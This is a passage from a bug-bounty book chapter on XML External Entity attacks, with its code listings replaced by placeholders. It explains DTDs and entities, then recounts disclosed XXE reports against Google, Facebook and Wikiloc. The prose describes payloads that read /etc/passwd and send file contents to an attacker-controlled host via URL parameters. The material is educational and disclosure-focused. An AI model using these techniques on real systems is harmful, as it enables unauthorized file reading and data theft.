- en: '**11'
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: XML EXTERNAL ENTITY**
  prefs: []
  type: TYPE_NORMAL
- en: '![Image](../images/common.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Attackers can exploit how an application parses *eXtensible Markup Language
    (XML)* by taking advantage of an *XML External Entity (XXE)* vulnerability. More
    specifically, it involves exploiting how the application processes the inclusion
    of external entities in its input. You can use an XXE to extract information from
    a server or to call on a malicious server.
  prefs: []
  type: TYPE_NORMAL
- en: '**eXtensible Markup Language**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: This vulnerability takes advantage of the external entities used in XML. XML
    is a *metalanguage*, meaning it’s used to describe other languages. It was developed
    as a response to the shortcomings of HTML, which can define only how data is *displayed*.
    In contrast, XML defines how data is *structured*.
  prefs: []
  type: TYPE_NORMAL
- en: For example, HTML can format text as a header using the opening header tag `<h1>`
    and a closing tag `</h1>`. (For some tags, the closing tag is optional.) Each
    tag can have a predefined style that the browser applies to the text on a website
    when it renders it. For example, the `<h1>` tag might format all headers as bold
    with a 14px font size. Similarly, the `<table>` tag presents data in rows and
    columns, and `<p>` tags define how text should look for regular paragraphs.
  prefs: []
  type: TYPE_NORMAL
- en: 'In contrast, XML has no predefined tags. Instead, you define the tags yourself,
    and those definitions won’t necessarily be included in the XML file. For example,
    consider the following XML file, which presents a job listing:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: All the tags are author defined, so it’s impossible to know from the file alone
    how this data would look on a web page.
  prefs: []
  type: TYPE_NORMAL
- en: The first line ➊ is a declaration header indicating the XML 1.0 version and
    type of Unicode encoding to be used. After the initial header, the `<Jobs>` tag
    ➋ wraps all other `<Job>` tags ➌. Each `<Job>` tag wraps a `<Title>` ➍, `<Compensation>`
    ➎, and `<Responsibility>` ➏ tag. As in HTML, a basic XML tag is made up of two
    angle brackets surrounding the tag name. But unlike tags in HTML, all XML tags
    require a closing tag. In addition, each XML tag can have an attribute. For example,
    the `<Responsibility>` tag has the name `Responsibility` with an optional attribute
    made up of the attribute name `fundamental` and attribute value `1` ➏.
  prefs: []
  type: TYPE_NORMAL
- en: '***Document Type Definitions***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: Because the author can define any tag, a valid XML document must follow a set
    of general XML rules (these are beyond the scope of this book, but having a closing
    tag is one example) and match a *document type definition (DTD)*. An XML DTD is
    a set of declarations that define which elements exist, what attributes they can
    have, and which elements can be enclosed within other elements. (An *element*
    consists of the opening and closing tags, so an opening `<foo>` is a tag and a
    closing `</foo>` is also a tag, but `<foo></foo>` is an element.) XML files can
    either use an external DTD, or they can use an internal DTD that is defined within
    the XML document.
  prefs: []
  type: TYPE_NORMAL
- en: '**External DTDs**'
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: An external DTD is an external *.dtd* file the XML document references and fetches.
    Here’s what an external DTD file might look like for the jobs XML document shown
    earlier.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: Each element used in the XML document is defined in the DTD file using the keyword
    `!ELEMENT`. The definition of `Jobs` indicates that it can contain the element
    `Job`. The asterisk denotes that `Jobs` may contain zero or more `Job` elements.
    A `Job` element must contain a `Title`, `Compensation`, and `Responsibility` ➋.
    Each of these is also an element and can contain only HTML-parsable character
    data, denoted by `(#PCDATA)` ➌. The data definition `(#PCDATA)` tells the parser
    what type of characters will be enclosed in each XML tag. Lastly, `Responsibility`
    has an attribute declared using `!ATTLIST` ➍. The attribute is named ➎, and the
    `CDATA` ➏ tells the parser the tag will only contain character data that shouldn’t
    be parsed. The default value of `Responsibility` is defined as `0` ➐.
  prefs: []
  type: TYPE_NORMAL
- en: 'External DTD files are defined in the XML document using the `<!DOCTYPE>` element:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: In this case, we define a `<!DOCTYPE>` with the XML entity `note` ➊. XML entities
    are explained in the next section. But for now, just know that `SYSTEM` ➋ is a
    keyword that tells the XML parser to get the results of the *jobs.dtd* file ➌
    and use that wherever `note` ➊ is subsequently used in the XML.
  prefs: []
  type: TYPE_NORMAL
- en: '**Internal DTDs**'
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: 'It’s also possible to include the DTD within the XML document. To do so, the
    first line of the XML must also be a `<!DOCTYPE>` element. By using an internal
    DTD to combine the XML file and DTD, we’d get a document that looks like the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: Here, we have what’s referred to as an *internal DTD declaration*. Notice that
    we still begin with a declaration header, indicating our document conforms to
    XML 1.0 with UTF-8 encoding ➊. Immediately after, we define our `!DOCTYPE` for
    the XML to follow, this time by just writing out the entire DTD instead of a reference
    to an external file ➋. The rest of the XML document follows the DTD declaration
    ➌.
  prefs: []
  type: TYPE_NORMAL
- en: '***XML Entities***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: 'XML documents contain *XML entities*, which are like placeholders for information.
    Using our `<Jobs>` example again, if we wanted every job to include a link to
    our website, it would be tedious for us to write the address every time, especially
    if our URL could change. Instead, we can use an entity, have the parser fetch
    the URL at the time of parsing, and insert the value into the document. To create
    one, you declare a placeholder entity name in an `!ENTITY` tag along with the
    information to put in that placeholder. In the XML document, the entity name is
    prefixed with an ampersand (`&`) and ends with a semicolon (`;`). When the XML
    document is accessed, the placeholder name is substituted with the value declared
    in the tag. Entity names can do more than just replace placeholders with strings:
    they can also fetch the contents of a website or file using the `SYSTEM` tag along
    with a URL.'
  prefs: []
  type: TYPE_NORMAL
- en: 'We can update our XML file to include this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: Notice that I’ve added a `Website !ELEMENT`, but instead of `(#PCDATA)`, I’ve
    used `ANY` ➊. This data definition means the `Website` tag can contain any combination
    of parsable data. I’ve also defined an `!ENTITY` with a `SYSTEM` attribute, telling
    the parser to get the contents of the *website.txt* file wherever the placeholder
    name `url` is inside a `website` tag ➋. At ➌ I use the `website` tag, and the
    contents of *website.txt* would be fetched in the place of `&url;`. Note the `&`
    in front of the entity name. Whenever you reference an entity in an XML document,
    you must precede it with `&`.
  prefs: []
  type: TYPE_NORMAL
- en: '**How XXE Attacks Work**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: In an XXE attack, an attacker abuses a target application so that it includes
    external entities in its XML parsing. In other words, the application expects
    some XML but isn’t validating what it’s receiving; it just parses anything it
    gets. For instance, let’s say the job board in the previous example lets you register
    and upload jobs via XML.
  prefs: []
  type: TYPE_NORMAL
- en: The job board might make its DTD file available to you and assume that you’ll
    submit a file matching the requirements. Instead of having the `!ENTITY` retrieve
    the contents of `"website.txt"`, you could have it retrieve the contents of `"/etc/passwd"`.
    The XML would be parsed, and the contents of the server file */etc/passwd* would
    be included in our content. (The */etc/passwd* file originally stored all usernames
    and passwords on a Linux system. Although Linux systems now store passwords in
    */etc/shadow*, it’s still common to read the */etc/passwd* file to prove that
    a vulnerability exists.)
  prefs: []
  type: TYPE_NORMAL
- en: 'You might submit something like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: The parser receives this code and recognizes an internal DTD defining a `foo`
    document type ➊. The DTD tells the parser that `foo` can include any parsable
    data ➋; then there’s an entity `xxe` that should read my */etc/passwd* file (*file://*
    denotes a full URI path to the */etc/passwd* file) when the document is parsed.
    The parser should replace `&xxe;` elements with those file contents ➌. Then, you
    finish it off with XML defining a `<foo>` tag that contains `&xxe;`, which prints
    my server info ➍. And that, friends, is why XXE is so dangerous.
  prefs: []
  type: TYPE_NORMAL
- en: 'But wait, there’s more. What if the application didn’t print a response and
    only parsed my content? If the contents of the sensitive file were never returned
    to me, would the vulnerability still be useful? Well, instead of parsing a local
    file, you could contact a malicious server like so:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: Now when the XML document is parsed, the `callhome` entity ➋ is replaced by
    the contents of a call to *www.<malicious>.com/?%xxe* ➌. But ➌ requires that `%xxe`
    be evaluated as defined in ➊. The XML parser reads */etc/passwd* and appends that
    as the parameter to the URL *www.<malicous>.com/*, thereby sending the file contents
    as a URL parameter ➌. Because you control that server, you would check your log,
    and sure enough, it would have the contents of */etc/passwd*.
  prefs: []
  type: TYPE_NORMAL
- en: You might have noticed the use of `%` instead of `&` in the `callhome` URL,
    `%xxe;` ➊. A `%` is used when the entity should be evaluated within the DTD definition.
    A `&` is used when the entity is evaluated in the XML document.
  prefs: []
  type: TYPE_NORMAL
- en: Sites protect against XXE vulnerabilities by disabling external entities from
    being parsed. The OWASP XML External Entity Prevention Cheat Sheet (see *[https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)*)
    has instructions on how to do this for a variety of languages.
  prefs: []
  type: TYPE_NORMAL
- en: '**Read Access to Google**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** Medium'
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** *https://google.com/gadgets/directory?synd=toolbar/*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** *[https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** April 2014'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** $10,000'
  prefs: []
  type: TYPE_NORMAL
- en: This Google read access vulnerability exploited a feature of Google’s Toolbar
    button gallery that allowed developers to define their own buttons by uploading
    XML files containing metadata. Developers could search the buttons gallery, and
    Google would show a description of the button in the search results.
  prefs: []
  type: TYPE_NORMAL
- en: According to the Detectify team, when an XML file that referenced an entity
    to an external file was uploaded to the gallery, Google parsed the file and then
    rendered the contents in the button search results.
  prefs: []
  type: TYPE_NORMAL
- en: As a result, the team used the XXE vulnerability to render the contents of the
    server’s */etc/passwd* file. At a minimum, this demonstrated that malicious users
    could exploit the XXE vulnerability to read internal files.
  prefs: []
  type: TYPE_NORMAL
- en: '***Takeaways***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: Even big companies can make mistakes. Whenever a site accepts XML, no matter
    who owns the site, always test for XXE vulnerabilities. Reading an */etc/passwd*
    file is a good way to demonstrate a vulnerability’s impact on companies.
  prefs: []
  type: TYPE_NORMAL
- en: '**Facebook XXE with Microsoft Word**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** Hard'
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** *[https://facebook.com/careers/](https://facebook.com/careers/)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** Attack Secure Blog'
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** April 2014'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** $6,300'
  prefs: []
  type: TYPE_NORMAL
- en: This Facebook XXE is a little more challenging than the previous example because
    it involves remotely calling a server. In late 2013, Facebook patched an XXE vulnerability
    discovered by Reginaldo Silva. Silva immediately reported the XXE to Facebook
    and asked for permission to escalate it to a remote code execution (a type of
    vulnerability covered in [Chapter 12](ch12.xhtml#ch12)). He believed a remote
    code execution was possible because he could read most files on the server and
    open arbitrary network connections. Facebook investigated and agreed, paying him
    $30,000.
  prefs: []
  type: TYPE_NORMAL
- en: 'As a result, Mohamed Ramadan challenged himself to hack Facebook in April 2014\.
    He didn’t think another XXE was a possibility until he found Facebook’s careers
    page, which allowed users to upload *.docx* files. The *.docx* file type is just
    an archive for XML files. Ramadan created a *.docx* file, opened it with 7-Zip
    to extract its contents, and inserted the following payload into one of the XML
    files:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'If the target has external entities enabled, the XML parser will evaluate the
    `%dtd;` ➌ entity, which makes a remote call to Ramadan’s server *http://197.37.102.90/ext.dtd*
    ➋. That call would return the following, which is the contents of the *ext.dtd*
    file:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: First, `%dtd;` would reference the external *ext.dtd* file and make the `%send;`
    entity available ➎. Next, the parser would parse `%send;` ➍, which would make
    a remote call to `http://197.37.102.90/FACEBOOK-HACKED?%file;` ➎. The `%file;`
    references the */etc/passwd* file ➊, so its contents would replace `%file;` in
    the HTTP request ➎.
  prefs: []
  type: TYPE_NORMAL
- en: Calling a remote IP to exploit an XXE isn’t always necessary, although it can
    be useful when sites parse remote DTD files but block access to reading local
    files. This is similar to a server-side request forgery (SSRF), which was discussed
    in [Chapter 10](ch10.xhtml#ch10). With an SSRF, if a site blocks access to internal
    addresses but allows calls to external sites and follows 301 redirects to internal
    addresses, you can achieve a similar result.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, Ramadan started a local HTTP server on his server to receive the call
    and content using Python and SimpleHTTPServer:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: At ➊ is the command to start Python SimpleHTTPServer, which returns the message
    `"Serving HTTP on 0.0.0.0 port 80..."` at ➋. The terminal waits until it receives
    an HTTP request to the server. At first, Ramadan didn’t receive a response, but
    he waited until he finally got a remote call at ➌ to retrieve the */ext.dtd* file.
    As expected, he then saw the call back to the server */FACEBOOK-HACKED?* ➍, but
    unfortunately without the contents of the */etc/passwd* file appended. This meant
    that either Ramadan couldn’t read local files using the vulnerability or that
    */etc/passwd* didn’t exist.
  prefs: []
  type: TYPE_NORMAL
- en: Before I continue with this report, I should add that Ramadan could have submitted
    a file that didn’t make a remote call to his server and instead could have just
    attempted to read the local file. But the initial call for the remote DTD file
    demonstrates an XXE vulnerability if successful, whereas a failed attempt at reading
    a local file doesn’t. In this case, because Ramadan recorded HTTP calls to his
    server from Facebook, he could prove Facebook was parsing remote XML entities
    and that a vulnerability existed even though he couldn’t access */etc/passwd*.
  prefs: []
  type: TYPE_NORMAL
- en: When Ramadan reported the bug, Facebook replied asking for a proof of concept
    video because they couldn’t replicate the upload. After Ramadan supplied a video,
    Facebook then rejected the submission and suggested that a recruiter had clicked
    a link, which initiated the request to his server. After exchanging a few emails,
    the Facebook team did some more digging to confirm the vulnerability existed and
    awarded a bounty. Unlike the initial XXE in 2013, the impact of Ramadan’s XXE
    couldn’t have been escalated to a remote code execution, so Facebook awarded a
    smaller bounty.
  prefs: []
  type: TYPE_NORMAL
- en: '***Takeaways***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: 'There are a couple of takeaways here. XML files come in different shapes and
    sizes: keep an eye out for sites that accept *.docx*, *.xlsx*, *.pptx*, and other
    XML file types because there might be custom applications parsing the file’s XML.
    At first, Facebook thought an employee clicked a malicious link that connected
    to Ramadan’s server, which wouldn’t be considered an SSRF. But upon further investigation,
    Facebook confirmed the request was invoked through a different method.'
  prefs: []
  type: TYPE_NORMAL
- en: As you’ve seen in other examples, sometimes reports are initially rejected.
    It’s important to have confidence and to continue working with the company you’re
    reporting to if you’re certain the vulnerability is valid. Don’t shy away from
    explaining why something might be a vulnerability or more severe than the company’s
    initial assessment.
  prefs: []
  type: TYPE_NORMAL
- en: '**Wikiloc XXE**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** Hard'
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** *[https://wikiloc.com/](https://wikiloc.com/)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** *[https://www.davidsopas.com/wikiloc-xxe-vulnerability/](https://www.davidsopas.com/wikiloc-xxe-vulnerability/)*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** October 2015'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** Swag'
  prefs: []
  type: TYPE_NORMAL
- en: Wikiloc is a website for discovering and sharing the best outdoor trails for
    hiking, cycling, and many other activities. It also lets users upload their own
    tracks via XML files, which turns out to be very enticing for cyclist hackers
    like David Sopas.
  prefs: []
  type: TYPE_NORMAL
- en: 'Sopas registered for Wikiloc and, after noticing the XML upload, decided to
    test it for an XXE vulnerability. To start, he downloaded a file from the site
    to determine Wikiloc’s XML structure, which in this case was a *.gpx* file. He
    then modified the file and uploaded it. This is the file with his modifications:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: At ➊, he added an external entity definition as the first line of the file.
    At ➋, he called the entity from within the track name in the *.gpx* file.
  prefs: []
  type: TYPE_NORMAL
- en: Uploading the file back to Wikiloc resulted in an `HTTP GET` request to Sopas’s
    server. This is notable for two reasons. First, by using a simple proof of concept
    call, Sopas was able to confirm that the server was evaluating his injected XML
    and the server would make external calls. Second, Sopas used the existing XML
    document so his content fit within the structure the site was expecting.
  prefs: []
  type: TYPE_NORMAL
- en: 'After Sopas had confirmed that Wikiloc would make external HTTP requests, the
    only other question was whether it would read local files. So, he modified his
    injected XML to have Wikiloc send him its */etc/issue* file contents (the */etc/issue*
    file will will return the operating system used):'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'This code should look familiar. Here he has used two entities at ➊ and ➋, which
    are defined using `%` because they’ll be evaluated in the DTD. At ➌, he retrieves
    the *xxe.dtd* file. The reference to `&send;` ➍ in the tag gets defined by the
    returned *xxe.dtd* file he serves back to Wikiloc from the remote call to his
    server ➋. Here’s the *xxe.dtd* file:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: 'The `% all` ➎ defines the entity `send` at ➍. Sopas’s execution is similar
    to Ramadan’s approach to Facebook but with a subtle difference: Sopas attempted
    to ensure that all places the XXE could be executed were included. That is why
    he calls `%dtd;` ➌ right after defining it in the internal DTD and `%all;` ➏ immediately
    after defining it in the external DTD. The executed code is on the backend of
    the site, so you likely won’t know exactly how the vulnerability was executed.
    But here’s what the parsing process could have looked like:'
  prefs: []
  type: TYPE_NORMAL
- en: Wikiloc parses the XML and evaluates `%dtd;` as an external call to Sopas’s
    server. Then Wikiloc requests the *xxe.dtd* file on Sopas’s server.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Sopas’s server returns the *xxe.dtd* file to Wikiloc.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Wikiloc parses the received DTD file, which triggers the call to `%all`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: When `%all` is evaluated, it defines `&send;`, which includes a call on the
    entity `%file`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The `%file;` call in the URL value is replaced with the contents of the */etc/issue*
    file.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Wikiloc parses the XML document. This parses the `&send;` entity, which evaluates
    to a remote call to Sopas’s server with the contents of the */etc/issue* file
    as a parameter in the URL.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In his own words, game over.
  prefs: []
  type: TYPE_NORMAL
- en: '***Takeaways***'
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: This is a great example of how you can use a site’s XML templates to embed your
    own XML entities so the file is parsed by the target. In this case, Wikiloc was
    expecting a *.gpx* file and Sopas kept that structure, inserting his own XML entities
    within expected tags. Additionally, it’s interesting to see how you can serve
    a malicious DTD file back to have a target make `GET` requests to your server
    with file contents as URL parameters. This is an easy way to facilitate data extraction
    because the `GET` parameters will be logged on your server.
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'An XXE represents an attack vector with huge potential. You can accomplish
    an XXE attack in a few ways: getting a vulnerable application to print its */etc/passwd*
    file, calling to a remote server using the */etc/passwd* file’s contents, and
    calling for a remote DTD file that instructs the parser to callback to a server
    with the */etc/passwd* file.'
  prefs: []
  type: TYPE_NORMAL
- en: Keep an eye out for file uploads, especially those that take some form of XML.
    You should always test them for XXE vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
